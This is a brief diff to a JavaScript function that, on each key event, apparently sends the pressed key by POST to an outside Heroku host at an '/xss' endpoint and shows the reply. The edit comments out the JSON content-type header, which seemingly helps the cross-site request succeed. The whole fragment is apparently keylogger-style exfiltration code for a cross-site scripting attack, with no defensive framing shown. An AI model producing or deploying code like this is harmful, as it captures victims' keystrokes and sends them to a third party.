@@ -33,7 +33,7 @@ function loadDoc(e) {
     $.ajax({
         type: 'POST',
         url: 'http://blog-torf.herokuapp.com/xss',
-        contentType: 'application/json',
+        // contentType: 'application/json',
         data: JSON.stringify({key: e.key})
     }).done(function(data) {
         alert(data);
